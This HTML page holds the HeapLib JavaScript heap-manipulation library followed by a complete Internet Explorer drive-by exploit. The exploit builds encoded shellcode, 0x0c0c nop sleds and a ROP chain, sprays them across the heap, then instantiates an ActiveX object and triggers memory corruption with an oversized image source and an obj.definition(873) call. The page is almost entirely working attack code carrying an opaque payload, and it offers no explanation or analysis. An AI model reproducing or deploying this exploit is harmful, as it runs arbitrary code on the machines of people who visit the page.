<html>
<head>
<script>
//
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}


var heap_obj = new heapLib.ie(0x20000);
var code = unescape("%u8343%ubef9%ubb4f%u1497%u3cb2%ub9b4%u3847%uc1fe%u78d6%u493f%u7915%u9105%uf887%ub43d%u7f74%u4273%ue381%ue101%u9925%ue086%u7677%u4347%u0d40%u1cb8%u8434%u8dd5%u2d7a%u9193%u0b72%ue2d3%u4e7d%u1db5%u31b1%u49eb%u469b%u0435%u2471%u9fa9%u0c7e%ub9ba%ubf15%u8090%uc6ff%uc0c7%u37d6%ub097%u6bbe%ub6fd%u4175%u7870%ua82c%u3f3c%u394a%u67f9%ubb96%u2a92%u66d4%u2048%u98fc%u4f27%uf523%u147c%u4bb3%u2f7b%ub2b7%u4605%ue211%u7971%u137e%u27fd%u477f%u8d2d%u30b7%u1dd6%u7b34%ub21c%ub84b%u2c78%ua80c%u6b73%ue0f7%u7a74%u9925%u9141%u7cba%u7d75%u7748%u663c%ub5be%ub3a9%u4ab4%u1a67%u14fc%ud187%u90f9%uf51b%u43b9%ubb24%ue311%u0b76%u38f8%u92d4%u0597%ud52b%u1949%ud2f6%u0de1%u35b6%ueb29%u3d42%u7072%u4e15%ub104%u9b9f%u3f93%u96bf%ub02f%u404f%u9837%u7748%ueb01%u2334%u9bf9%u7bb7%ue22a%u7e0d%u257d%u7597%ue109%u6742%u7972%u4e40%u98b1%ubb15%u18b0%ufcd0%u3341%u71fd%u2105%u1de0%u747a%ue332%u4373%u2f04%u1cb2%ua893%u8db9%ud43b%u3f14%u35ba%ub437%u92b8%ub54a%u2c0c%ube3d%u3c9f%ub647%u994f%u2491%u4966%uf508%u704b%u9046%ud603%u78bf%u8027%u2df8%u767c%u797f%ud569%ua996%ua8b3%u8dbe%ub0b1%ub2b9%ue281%u0442%u2c76%ubf97%u0c3d%u25b7%ud331%u9ff9%ueb84%u9049%ue183%u2740%ue010%u7472%u7e05%u7167%u7b43%u2275%u30d4%u70d5%u477a%ubb9b%u96b6%ue386%u774b%ufc20%u247d%u8992%u7cf8%u6646%u9991%ua94e%ub598%uf528%u1cb3%u7f37%u7378%u151d%u4835%u4f93%ub4b8%ue388%u7f3c%ufd0a%u4179%u1377%ue1c1%ud639%u147a%u2d73%u0d78%u3471%u3f7c%u8cba%u2fe2%u4a7e%u7db9%u7424%u663f%ueb12%u7b04%u4241%u759f%ud43a%u2770%ubb4e%u97fc%u914f%u9b4b%ub2d6%u35ba%u4ab3%ue0c0%u761d%u920c%u721c%u8505%u93fd%ub847%uf9f5%u2d99%ub415%u8d37%ubf48%u40b6%ua82f%u3425%u3d43%u9049%u0d2c%u673c%ub0be%u14b5%u98b1%uf8a9%ud502%u46b7%uda96%ud9d2%u2474%ubdf4%uccbe%ubc83%u2b5f%ub1c9%u3172%u176f%uef83%u03fc%udfd1%u4961%u08d1%ub2ec%uc929%u3b8f%uf8cc%u589d%ua985%u2a11%u41cb%u7ed9%ud2ff%u56af%u53f0%u8105%u633f%u0dab%ua793%uf1ad%ufbe9%ucb0d%u0e22%u0c4f%ue15e%uc51d%u5015%u62b2%u696b%ua4b3%ud1e0%uc1cb%ua536%ucb61%u1666%u83fd%u1c9e%u3459%uf19f%u08b9%u7ed6%ufa09%u56e9%u0343%u96d8%u3a08%u1ad5%u7a50%uc4d1%u7027%u7822%u4330%ua659%u56b5%u2df9%ub36d%ue2f8%u30e8%u4ff6%u1e7e%u511a%u1453%uda26%ufb52%u98af%udf70%u7bf4%u4618%u2d50%u9825%u923c%ud283%uc7ae%ub8b2%u79a6%u36de%uee36%ude57%u8758%uc61e%u3ff0%u706d%ub8de%uab92%u382f%u033b%u9118%uc392%u4b9c%ub362%ua61f%udb7f%u7884%u4d49%u116b%u3f4a%u8fda%uec1c%u278c%u9bca%u7eb3%u4e0b%u3120%u40ad%u9c64%ua325%u41ba%uf132%ud3e8%ua46b%ubc5c%u1d60%u0772%u4b88%ub103%u641c%u5648%ub761%ua66e%u58e8%ua204%uf2ba%ufcc7%u7652%u9eb1%u8725%uaee8%u2fd6%u8645%u867f%u0501%u3e86%uaaaa%ubb53%u208c%u8f7f%u4f03%u0fff%u4f1b%uc1eb%uddf2%ue1eb%u0a04%u1e47%u35fb%u83b7%ua571%u30bf%u4b10%ud16f%u85bc%u650a%uda25%ufe3f%u1a94%u51e0%u98bc%u5075%uf710%u3e8b%u5092%u64e4%u8464%u67bb%uaa5d%u5875%u753b%u5b71%u41ea%ud62e%u6da0%ud9c7%udaf8%u49d4%u74a9%u7bb3%uf0df%u83a1%u870a%u08e6%ud099%u3063%uf695%ub101%ua701%uf558%u4b8d%ua533%u7ea5%ue7e4%u7e6e%u7bdf%u847c%ub50b%ued2f%udc0d%ubf48%u346e%u403c%udfc6%ucbf1%u9887%u1e0e%ua73d%u5198%u0577%u6d0e%ua2ad%u6e3e%uccb1%ue44c%u5720%u3781%uf293%u5299%u14eb%u625d%u1b14%ue52e%u9098%u78b5%u2972%uea54%ua4e9%u82f3%u1885%u3598%u650b");
var nops = unescape("%u0c0c%u0c0c");
var nops_90 = unescape("%u924e%u474a");
var rop_chain = unescape("%uec01%u77c4%uec00%u77c4%u5ed5%u77c1%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uee15%u77c3%uee15%u77c3%ufa1c%u77c4%u0400%u0000%u0d13%u77c5%u0040%u0000%ueeef%u77c3%ud9bb%u77c5%ua88c%u77c2%u9f92%u77c3%ua184%u77c3%uaacc%u77c2%ub860%u77c3%u1120%u77c1%u2df9%u77c1%u5459%u77c3");

while (nops.length < 0x80000) nops += nops;
while (nops_90.length < 0x80000) nops_90 += nops_90;

var offset = nops.substring(0, 0x0);
var nops_padding = nops.substring(0, 0x5f4-code.length-offset.length);
var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);


while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(0, (0x80000-6)/2);


heap_obj.gc();
for (var z=1; z < 0x230; z++) {
	heap_obj.alloc(block);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="pDln"></object>
<script>
var obj = document.getElementById('pDln').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(873);
</script>
</body>
</html>
